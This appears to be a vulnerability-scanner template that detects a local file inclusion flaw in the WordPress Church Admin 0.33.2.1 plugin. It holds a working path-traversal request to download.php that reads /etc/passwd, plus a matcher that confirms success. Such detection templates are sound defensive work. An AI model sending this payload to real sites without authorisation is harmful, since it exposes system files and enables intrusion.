id: "church-admin-lfi"
name: "WordPress Church Admin 0.33.2.1 - Local File Inclusion"
severity: "high"
description: "WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion via the \"key\" parameter of plugins/church-admin/display/download.php."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "wp-plugin"
  - "lfi"
  - "wpscan"
  - "vuln"
cwe: "CWE-23"
reference: "https://wpscan.com/vulnerability/8997"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
